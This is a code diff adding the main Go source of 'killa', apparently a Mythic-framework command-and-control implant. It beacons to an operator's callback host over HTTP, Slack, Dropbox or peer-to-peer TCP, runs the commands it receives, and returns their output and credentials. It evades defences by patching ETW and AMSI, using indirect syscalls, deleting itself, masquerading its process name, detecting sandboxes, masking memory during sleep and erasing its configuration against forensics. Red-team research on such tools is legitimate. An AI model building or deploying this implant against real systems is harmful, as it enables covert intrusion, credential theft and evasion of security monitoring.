@@ -1,0 +1,798 @@
+package main
+
+import (
+	"context"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"math/rand"
+	"net"
+	"os"
+	"os/signal"
+	"regexp"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+
+	"github.com/google/uuid"
+
+	"killa/pkg/commands"
+	"killa/pkg/dropbox"
+	"killa/pkg/files"
+	"killa/pkg/http"
+	"killa/pkg/profiles"
+	"killa/pkg/rpfwd"
+	"killa/pkg/slack"
+	"killa/pkg/socks"
+	"killa/pkg/structs"
+	"killa/pkg/tcp"
+)
+
+var (
+	// These variables are populated at build time by the Go linker
+	payloadUUID          string = ""
+	callbackHost         string = ""
+	callbackPort         string = "443"
+	userAgent            string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+	sleepInterval        string = "10"
+	jitter               string = "10"
+	encryptionKey        string = ""
+	killDate             string = "0"
+	maxRetries           string = "10"
+	debug                string = "false"
+	getURI               string = "/data"
+	postURI              string = "/data"
+	hostHeader           string = ""     // Override Host header for domain fronting
+	proxyURL             string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
+	tlsVerify            string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
+	workingHoursStart    string = ""     // Working hours start (HH:MM, 24hr local time)
+	workingHoursEnd      string = ""     // Working hours end (HH:MM, 24hr local time)
+	workingDays          string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
+	tcpBindAddress       string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
+	transportType        string = "http" // Transport profile: http, tcp, slack, dropbox
+	slackBotToken        string = ""     // Slack bot OAuth token
+	slackChannelID       string = ""     // Slack channel or DM ID
+	slackPollInterval    string = "5"    // Slack polling interval seconds
+	dropboxToken         string = ""     // Dropbox OAuth access token
+	dropboxTaskFolder    string = ""     // Dropbox folder to read inbound instruction files
+	dropboxResultFolder  string = ""     // Dropbox folder to write outbound result files
+	dropboxArchiveFolder string = ""     // Dropbox folder to move processed instruction files
+	dropboxPollInterval  string = "5"    // Dropbox polling interval seconds
+	envKeyHostname       string = ""     // Environment key: hostname must match this regex
+	envKeyDomain         string = ""     // Environment key: domain must match this regex
+	envKeyUsername       string = ""     // Environment key: username must match this regex
+	envKeyProcess        string = ""     // Environment key: this process must be running
+	selfDelete           string = ""     // Self-delete binary from disk after execution starts
+	masqueradeName       string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
+	customHeaders        string = ""     // Base64-encoded JSON of additional HTTP headers
+	autoPatch            string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
+	blockDLLs            string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
+	indirectSyscalls     string = ""     // Enable indirect syscalls at startup (Windows only)
+	xorKey               string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
+	sandboxGuard         string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
+	sleepMask            string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
+)
+
+func main() {
+	runAgent()
+}
+
+func runAgent() {
+	// Deobfuscate C2 config strings if XOR key is present
+	if xorKey != "" {
+		keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
+		if err == nil && len(keyBytes) > 0 {
+			payloadUUID = xorDecodeString(payloadUUID, keyBytes)
+			callbackHost = xorDecodeString(callbackHost, keyBytes)
+			callbackPort = xorDecodeString(callbackPort, keyBytes)
+			userAgent = xorDecodeString(userAgent, keyBytes)
+			encryptionKey = xorDecodeString(encryptionKey, keyBytes)
+			getURI = xorDecodeString(getURI, keyBytes)
+			postURI = xorDecodeString(postURI, keyBytes)
+			hostHeader = xorDecodeString(hostHeader, keyBytes)
+			proxyURL = xorDecodeString(proxyURL, keyBytes)
+			customHeaders = xorDecodeString(customHeaders, keyBytes)
+			// Zero the XOR key — no longer needed after deobfuscation
+			zeroBytes(keyBytes)
+		}
+	}
+
+	// Convert string build variables to appropriate types with validation
+	callbackPortInt, err := strconv.Atoi(callbackPort)
+	if err != nil {
+		log.Printf("[WARNING] Invalid callbackPort %q, defaulting to 443", callbackPort)
+		callbackPortInt = 443
+	}
+	sleepIntervalInt, err := strconv.Atoi(sleepInterval)
+	if err != nil || sleepIntervalInt < 0 {
+		log.Printf("[WARNING] Invalid sleepInterval %q, defaulting to 10", sleepInterval)
+		sleepIntervalInt = 10
+	}
+	jitterInt, err := strconv.Atoi(jitter)
+	if err != nil || jitterInt < 0 || jitterInt > 100 {
+		log.Printf("[WARNING] Invalid jitter %q, defaulting to 10", jitter)
+		jitterInt = 10
+	}
+	killDateInt64, err := strconv.ParseInt(killDate, 10, 64)
+	if err != nil {
+		log.Printf("[WARNING] Invalid killDate %q, defaulting to 0 (disabled)", killDate)
+		killDateInt64 = 0
+	}
+	maxRetriesInt, err := strconv.Atoi(maxRetries)
+	if err != nil || maxRetriesInt < 0 {
+		log.Printf("[WARNING] Invalid maxRetries %q, defaulting to 10", maxRetries)
+		maxRetriesInt = 10
+	}
+	debugBool, err := strconv.ParseBool(debug)
+	if err != nil {
+		debugBool = false
+	}
+
+	// Setup logging — suppress all output in production to avoid leaking operational details to stderr
+	if debugBool {
+		log.SetOutput(os.Stdout)
+	} else {
+		log.SetOutput(io.Discard)
+	}
+
+	// Verify required configuration
+	if payloadUUID == "" {
+		payloadUUID = uuid.New().String()
+		log.Printf("[WARNING] No payload UUID provided, generated: %s", payloadUUID)
+	}
+
+	// Check kill date
+	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
+		log.Printf("[INFO] Agent past kill date, exiting")
+		os.Exit(0)
+	}
+
+	// Check environment keys — exit silently if any check fails (no network activity)
+	if !checkEnvironmentKeys() {
+		os.Exit(0)
+	}
+
+	// Auto-patch ETW/AMSI: neutralize detection before any activity (Windows only)
+	if autoPatch == "true" {
+		autoStartupPatch()
+	}
+
+	// Initialize indirect syscalls: resolve Nt* syscall numbers from ntdll (Windows only)
+	if indirectSyscalls == "true" {
+		initIndirectSyscalls()
+	}
+
+	// Self-delete: remove binary from disk after startup (process continues from memory)
+	if selfDelete == "true" {
+		selfDeleteBinary()
+	}
+
+	// Process name masquerade: change /proc/self/comm on Linux
+	if masqueradeName != "" {
+		masqueradeProcess(masqueradeName)
+	}
+
+	// Parse working hours configuration
+	whStartMinutes := 0
+	whEndMinutes := 0
+	var whDays []int
+	if workingHoursStart != "" {
+		if parsed, err := structs.ParseWorkingHoursTime(workingHoursStart); err != nil {
+			log.Printf("[WARNING] Invalid workingHoursStart %q: %v", workingHoursStart, err)
+		} else {
+			whStartMinutes = parsed
+		}
+	}
+	if workingHoursEnd != "" {
+		if parsed, err := structs.ParseWorkingHoursTime(workingHoursEnd); err != nil {
+			log.Printf("[WARNING] Invalid workingHoursEnd %q: %v", workingHoursEnd, err)
+		} else {
+			whEndMinutes = parsed
+		}
+	}
+	if workingDays != "" {
+		if parsed, err := structs.ParseWorkingDays(workingDays); err != nil {
+			log.Printf("[WARNING] Invalid workingDays %q: %v", workingDays, err)
+		} else {
+			whDays = parsed
+		}
+	}
+
+	// Initialize the agent
+	agent := &structs.Agent{
+		PayloadUUID:       payloadUUID,
+		Architecture:      runtime.GOARCH,
+		Domain:            "",
+		ExternalIP:        "",
+		Host:              getHostname(),
+		Integrity:         getIntegrityLevel(),
+		InternalIP:        getInternalIP(),
+		OS:                getOperatingSystem(),
+		PID:               os.Getpid(),
+		ProcessName:       os.Args[0],
+		SleepInterval:     sleepIntervalInt,
+		Jitter:            jitterInt,
+		User:              getUsername(),
+		Description:       payloadUUID[:8],
+		KillDate:          killDateInt64,
+		WorkingHoursStart: whStartMinutes,
+		WorkingHoursEnd:   whEndMinutes,
+		WorkingDays:       whDays,
+	}
+
+	// Initialize C2 profile based on configuration
+	var c2 profiles.Profile
+
+	transport := strings.ToLower(strings.TrimSpace(transportType))
+	if transport == "" {
+		transport = "http"
+	}
+	if transport == "tcp" || tcpBindAddress != "" {
+		// TCP P2P mode — this agent is a child that listens for a parent connection
+		log.Printf("[INFO] TCP P2P mode: binding to %s", tcpBindAddress)
+		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
+		c2 = profiles.NewTCPProfile(tcpProfile)
+		// Make TCP profile available to link/unlink commands
+		commands.SetTCPProfile(tcpProfile)
+	} else if transport == "slack" {
+		if strings.TrimSpace(slackBotToken) == "" || strings.TrimSpace(slackChannelID) == "" {
+			log.Printf("[ERROR] Slack transport requires slack_bot_token and slack_channel_id from Mythic C2 parameters (no .env fallback)")
+			return
+		}
+		pollInterval, _ := strconv.Atoi(slackPollInterval)
+		slackProfile := slack.NewSlackProfile(slackBotToken, slackChannelID, encryptionKey, pollInterval, debugBool)
+		c2 = profiles.NewSlackProfile(slackProfile)
+	} else if transport == "dropbox" {
+		if strings.TrimSpace(dropboxToken) == "" {
+			log.Printf("[ERROR] Dropbox transport requires dropbox_token from Mythic C2 parameters (no .env fallback)")
+			return
+		}
+		pollInterval, _ := strconv.Atoi(dropboxPollInterval)
+		dropboxProfile := dropbox.NewDropboxProfile(dropboxToken, dropboxTaskFolder, dropboxResultFolder, dropboxArchiveFolder, encryptionKey, pollInterval, debugBool)
+		c2 = profiles.NewDropboxProfile(dropboxProfile)
+	} else {
+		// HTTP egress mode (default)
+		var callbackURL string
+		if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
+			callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
+		} else {
+			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
+		}
+
+		httpProfile := http.NewHTTPProfile(
+			callbackURL,
+			userAgent,
+			encryptionKey,
+			maxRetriesInt,
+			sleepIntervalInt,
+			jitterInt,
+			debugBool,
+			getURI,
+			postURI,
+			hostHeader,
+			proxyURL,
+			tlsVerify,
+		)
+		// Decode and apply custom HTTP headers from C2 profile
+		if customHeaders != "" {
+			if decoded, err := base64.StdEncoding.DecodeString(customHeaders); err == nil {
+				var headers map[string]string
+				if err := json.Unmarshal(decoded, &headers); err == nil {
+					httpProfile.CustomHeaders = headers
+				}
+			}
+		}
+		c2 = profiles.NewProfile(httpProfile)
+
+		// Also create a TCP profile instance for P2P child management.
+		// Even HTTP egress agents can link to TCP children.
+		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		commands.SetTCPProfile(tcpP2P)
+
+		// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
+		httpProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
+			return tcpP2P.DrainDelegatesOnly()
+		}
+		httpProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+			return tcpP2P.DrainDelegatesAndEdges()
+		}
+		httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+			tcpP2P.RouteToChildren(delegates)
+		}
+
+		// Wire up rpfwd hooks for reverse port forwarding
+		rpfwdManager := rpfwd.NewManager()
+		defer rpfwdManager.Close()
+		commands.SetRpfwdManager(rpfwdManager)
+		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
+	}
+
+	// Configure child process protections (Windows: block non-Microsoft DLLs)
+	if blockDLLs == "true" {
+		commands.SetBlockDLLs(true)
+	}
+
+	// Clear build-time globals — all values have been copied into agent/profile structs.
+	// Prevents memory forensics from extracting sensitive config from the data segment.
+	sandboxGuardEnabled := sandboxGuard == "true"
+	sleepMaskEnabled := sleepMask == "true"
+	clearGlobals()
+
+	// Initialize command handlers
+	commands.Initialize()
+
+	// Initialize file transfer goroutines
+	files.Initialize()
+
+	// Initial checkin with exponential backoff retry
+	log.Printf("[INFO] Starting initial checkin...")
+	for attempt := 0; attempt < maxRetriesInt; attempt++ {
+		if err := c2.Checkin(agent); err != nil {
+			log.Printf("[ERROR] Initial checkin attempt %d failed: %v", attempt+1, err)
+			backoffMultiplier := 1 << min(attempt, 8)
+			backoffSeconds := sleepIntervalInt * backoffMultiplier
+			if backoffSeconds > 300 {
+				backoffSeconds = 300
+			}
+			sleepTime := calculateSleepTime(backoffSeconds, jitterInt)
+			time.Sleep(sleepTime)
+			continue
+		}
+		log.Printf("[INFO] Initial checkin successful")
+		goto checkinDone
+	}
+	log.Printf("[ERROR] All initial checkin attempts failed, exiting")
+	return
+checkinDone:
+
+	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
+	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
+	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.CallbackUUID == "" {
+		tcpP2P.CallbackUUID = c2.GetCallbackUUID()
+	}
+
+	// Create context for graceful shutdown
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	// Handle signals for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	defer signal.Stop(sigChan)
+
+	go func() {
+		sig := <-sigChan
+		log.Printf("[INFO] Received signal: %v, shutting down gracefully", sig)
+		cancel()
+	}()
+
+	// Initialize SOCKS proxy manager
+	socksManager := socks.NewManager()
+	defer socksManager.Close()
+
+	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
+	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled)
+	usePadding() // Reference embedded padding to prevent compiler stripping
+	log.Printf("[INFO] agent shutdown complete")
+}
+
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool) {
+	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
+	taskSem := make(chan struct{}, 20)
+
+	// Main execution loop
+	retryCount := 0
+	for {
+		select {
+		case <-ctx.Done():
+			log.Printf("[INFO] Context cancelled, exiting main loop")
+			return
+		default:
+			// Enforce kill date every cycle — exit silently if past expiry
+			if agent.KillDate > 0 && time.Now().Unix() > agent.KillDate {
+				log.Printf("[INFO] Kill date reached, exiting")
+				return
+			}
+
+			// Enforce working hours — sleep until next working period if outside hours
+			if agent.WorkingHoursEnabled() && !agent.IsWithinWorkingHours(time.Now()) {
+				waitMinutes := agent.MinutesUntilWorkingHours(time.Now())
+				if waitMinutes > 0 {
+					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
+					jitterOffset := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
+					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterOffset
+					log.Printf("[INFO] Outside working hours, sleeping %v until next work period", sleepDuration)
+					var whVault *sleepVault
+					if sleepMaskEnabled {
+						whVault = obfuscateSleep(agent, c2)
+					}
+					time.Sleep(sleepDuration)
+					if sleepMaskEnabled {
+						deobfuscateSleep(whVault, agent, c2)
+					}
+					continue
+				}
+			}
+
+			// Drain any pending outbound SOCKS data to include in this poll
+			outboundSocks := socksManager.DrainOutbound()
+
+			// Get tasks and inbound SOCKS data from C2 server
+			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
+			if err != nil {
+				log.Printf("[ERROR] Failed to get tasking: %v", err)
+				retryCount++
+				// Exponential backoff: sleep 2^(retryCount-1) * base interval, capped at 5 minutes
+				backoffMultiplier := 1 << min(retryCount-1, 8) // 1, 2, 4, 8, 16, ...
+				backoffSeconds := agent.SleepInterval * backoffMultiplier
+				maxBackoff := 300 // 5 minutes cap
+				if backoffSeconds > maxBackoff {
+					backoffSeconds = maxBackoff
+				}
+				sleepTime := calculateSleepTime(backoffSeconds, agent.Jitter)
+				time.Sleep(sleepTime)
+				continue
+			}
+
+			// Reset retry count on successful communication
+			retryCount = 0
+
+			// Pass inbound SOCKS messages to the manager for processing
+			if len(inboundSocks) > 0 {
+				socksManager.HandleMessages(inboundSocks)
+			}
+
+			// Process tasks concurrently — each task runs in its own goroutine
+			// so long-running commands (SOCKS, keylog, port-scan) don't block new tasks.
+			// Semaphore limits concurrency to prevent memory exhaustion.
+			for _, task := range tasks {
+				// Track task synchronously BEFORE spawning goroutine — prevents a race
+				// where obfuscateSleep sees GetRunningTasks()==0 because the goroutine
+				// hasn't called TrackTask yet, causing C2 profile fields to be zeroed
+				// while task goroutines still need them for PostResponse.
+				commands.TrackTask(&task)
+				taskSem <- struct{}{} // Acquire semaphore slot
+				go func(t structs.Task) {
+					defer func() { <-taskSem }() // Release slot when done
+					defer commands.UntrackTask(t.ID)
+					processTaskWithAgent(t, agent, c2, socksManager)
+				}(task)
+			}
+
+			// Sleep before next iteration — with optional sleep mask and sandbox detection
+			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+			var vault *sleepVault
+			if sleepMaskEnabled {
+				vault = obfuscateSleep(agent, c2)
+			}
+			sleepSkipped := false
+			if sandboxGuardEnabled {
+				if !guardedSleep(sleepTime) {
+					sleepSkipped = true
+				}
+			} else {
+				time.Sleep(sleepTime)
+			}
+			if sleepMaskEnabled {
+				deobfuscateSleep(vault, agent, c2)
+			}
+			if sleepSkipped {
+				log.Printf("[INFO] Sleep skipping detected, exiting")
+				return
+			}
+		}
+	}
+}
+
+func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
+	task.StartTime = time.Now()
+	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)
+
+	// Create Job struct with channels for this task
+	job := &structs.Job{
+		Stop:              new(int),
+		SendResponses:     make(chan structs.Response, 100),
+		SendFileToMythic:  files.SendToMythicChannel,
+		GetFileFromMythic: files.GetFromMythicChannel,
+		FileTransfers:     make(map[string]chan json.RawMessage),
+	}
+	task.Job = job
+
+	// Start goroutine to forward responses from the job to Mythic
+	done := make(chan bool)
+	var forwarderWg sync.WaitGroup
+	forwarderWg.Add(1)
+	go func() {
+		defer forwarderWg.Done()
+		for {
+			select {
+			case resp := <-job.SendResponses:
+				mythicResp, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
+				if err != nil {
+					log.Printf("[ERROR] Failed to post file transfer response: %v", err)
+					continue
+				}
+
+				// If this is a file transfer response, route Mythic's response back
+				if len(mythicResp) > 0 && (resp.Upload != nil || resp.Download != nil) {
+					// Parse the response to get tracking info
+					var responseData map[string]interface{}
+					if err := json.Unmarshal(mythicResp, &responseData); err == nil {
+						// Look for responses array
+						if responses, ok := responseData["responses"].([]interface{}); ok && len(responses) > 0 {
+							if firstResp, ok := responses[0].(map[string]interface{}); ok {
+								// Send this response to all active file transfer channels
+								respJSON, err := json.Marshal(firstResp)
+								if err != nil {
+									log.Printf("[ERROR] Failed to marshal file transfer response: %v", err)
+									continue
+								}
+								job.BroadcastFileTransfer(json.RawMessage(respJSON))
+							}
+						}
+					}
+				}
+			case <-done:
+				// Drain any remaining responses
+				for {
+					select {
+					case resp := <-job.SendResponses:
+						_, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
+						if err != nil {
+							log.Printf("[ERROR] Failed to post file transfer response: %v", err)
+						}
+					default:
+						return
+					}
+				}
+			}
+		}
+	}()
+
+	// Get command handler
+	handler := commands.GetCommand(task.Command)
+	if handler == nil {
+		response := structs.Response{
+			TaskID:     task.ID,
+			Status:     "error",
+			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
+			Completed:  true,
+		}
+		if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
+			log.Printf("[ERROR] Failed to post response: %v", err)
+		}
+		close(done)
+		return
+	}
+
+	// Re-apply token impersonation if active (handles Go thread migration)
+	commands.PrepareExecution()
+
+	// Execute command with panic recovery to prevent agent crash
+	var result structs.CommandResult
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				log.Printf("[ERROR] Command %s panicked: %v", task.Command, r)
+				result = structs.CommandResult{
+					Output:    fmt.Sprintf("Command panicked: %v", r),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+		}()
+		if agentHandler, ok := handler.(structs.AgentCommand); ok {
+			result = agentHandler.ExecuteWithAgent(task, agent)
+		} else {
+			result = handler.Execute(task)
+		}
+	}()
+
+	// Zero task parameters to reduce forensic exposure of credentials/arguments
+	task.WipeParams()
+
+	// Send final response
+	response := structs.Response{
+		TaskID:      task.ID,
+		UserOutput:  result.Output,
+		Status:      result.Status,
+		Completed:   result.Completed,
+		Processes:   result.Processes,
+		Credentials: result.Credentials,
+	}
+	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
+		log.Printf("[ERROR] Failed to post response: %v", err)
+	}
+
+	// Signal the response forwarder to finish and wait for it to drain
+	close(done)
+	forwarderWg.Wait()
+}
+
+func calculateSleepTime(interval, jitter int) time.Duration {
+	if jitter == 0 {
+		return time.Duration(interval) * time.Second
+	}
+
+	// Freyja-style jitter calculation
+	// Jitter is a percentage (0-100) that creates variation around the interval
+	jitterFloat := float64(rand.Intn(jitter)) / float64(100)
+	jitterDiff := float64(interval) * jitterFloat
+
+	// Randomly add or subtract jitter (50/50 chance)
+	if rand.Intn(2) == 0 {
+		// Add jitter
+		actualInterval := interval + int(jitterDiff)
+		return time.Duration(actualInterval) * time.Second
+	} else {
+		// Subtract jitter
+		actualInterval := interval - int(jitterDiff)
+		if actualInterval < 1 {
+			actualInterval = 1 // Minimum 1 second
+		}
+		return time.Duration(actualInterval) * time.Second
+	}
+}
+
+// Helper functions for system information
+func getHostname() string {
+	if hostname, err := os.Hostname(); err == nil {
+		return hostname
+	}
+	return "unknown"
+}
+
+func getUsername() string {
+	if user := os.Getenv("USER"); user != "" {
+		return user
+	}
+	if user := os.Getenv("USERNAME"); user != "" {
+		return user
+	}
+	return "unknown"
+}
+
+func getOperatingSystem() string {
+	return runtime.GOOS
+}
+
+func getInternalIP() string {
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return "127.0.0.1"
+	}
+	for _, iface := range ifaces {
+		// Skip loopback and down interfaces
+		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
+			continue
+		}
+		addrs, err := iface.Addrs()
+		if err != nil {
+			continue
+		}
+		for _, addr := range addrs {
+			var ip net.IP
+			switch v := addr.(type) {
+			case *net.IPNet:
+				ip = v.IP
+			case *net.IPAddr:
+				ip = v.IP
+			}
+			if ip == nil || ip.IsLoopback() {
+				continue
+			}
+			// Prefer IPv4
+			if ip4 := ip.To4(); ip4 != nil {
+				return ip4.String()
+			}
+		}
+	}
+	return "127.0.0.1"
+}
+
+// checkEnvironmentKeys validates all configured environment keys.
+// Returns true if all checks pass (or no keys configured). Returns false if any check fails.
+// On failure, the agent should exit silently — no logging, no network activity.
+func checkEnvironmentKeys() bool {
+	if envKeyHostname != "" {
+		hostname, _ := os.Hostname()
+		if !regexMatch(envKeyHostname, hostname) {
+			return false
+		}
+	}
+	if envKeyDomain != "" {
+		domain := getEnvironmentDomain()
+		if !regexMatch(envKeyDomain, domain) {
+			return false
+		}
+	}
+	if envKeyUsername != "" {
+		username := getUsername()
+		if !regexMatch(envKeyUsername, username) {
+			return false
+		}
+	}
+	if envKeyProcess != "" {
+		if !isProcessRunning(envKeyProcess) {
+			return false
+		}
+	}
+	return true
+}
+
+// regexMatch performs a case-insensitive full-string regex match.
+func regexMatch(pattern, value string) bool {
+	// Anchor the pattern to match the full string
+	anchored := "(?i)^(?:" + pattern + ")$"
+	re, err := regexp.Compile(anchored)
+	if err != nil {
+		// Invalid regex — fail closed (don't execute)
+		return false
+	}
+	return re.MatchString(value)
+}
+
+// xorDecodeString decodes a base64-encoded XOR-encrypted string.
+// If the input is empty or decoding fails, returns the original string.
+func xorDecodeString(encoded string, key []byte) string {
+	if encoded == "" || len(key) == 0 {
+		return encoded
+	}
+	data, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return encoded // not encoded, use as-is
+	}
+	result := make([]byte, len(data))
+	for i, b := range data {
+		result[i] = b ^ key[i%len(key)]
+	}
+	return string(result)
+}
+
+// guardedSleep performs a sleep with sandbox detection. If the sleep completes
+// in less than 75% of the expected duration, it indicates a sandbox is
+// fast-forwarding time. Returns true if sleep was normal, false if skipped.
+func guardedSleep(d time.Duration) bool {
+	if d <= 0 {
+		return true
+	}
+	before := time.Now()
+	time.Sleep(d)
+	elapsed := time.Since(before)
+	// If less than 75% of the requested duration actually elapsed,
+	// the sandbox is accelerating time.
+	threshold := d * 3 / 4
+	return elapsed >= threshold
+}
+
+// zeroBytes overwrites a byte slice with zeros to clear sensitive data from memory.
+func zeroBytes(b []byte) {
+	for i := range b {
+		b[i] = 0
+	}
+}
+
+// clearGlobals zeros out build-time global variables after they have been
+// copied into the agent/profile structs. This prevents sensitive config
+// data (encryption keys, C2 URLs, UUIDs) from lingering in the binary's
+// data segment where memory forensics tools could extract them.
+func clearGlobals() {
+	payloadUUID = ""
+	callbackHost = ""
+	callbackPort = ""
+	userAgent = ""
+	encryptionKey = ""
+	getURI = ""
+	postURI = ""
+	hostHeader = ""
+	proxyURL = ""
+	customHeaders = ""
+	xorKey = ""
+}
